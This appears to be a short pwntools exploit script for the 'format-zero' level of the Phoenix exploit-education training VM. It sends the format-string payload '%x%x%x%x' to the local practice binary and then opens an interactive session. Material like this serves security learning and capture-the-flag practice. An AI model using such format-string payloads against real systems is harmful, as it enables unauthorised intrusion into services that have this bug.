#! /usr/bin/python3
# -*- coding: utf-8 -*-

import pwn

elf = pwn.ELF('/opt/phoenix/amd64/format-zero')
p = elf.process()

payload = "%x%x%x%x"
p.sendlineafter("education\n", payload)
p.interactive()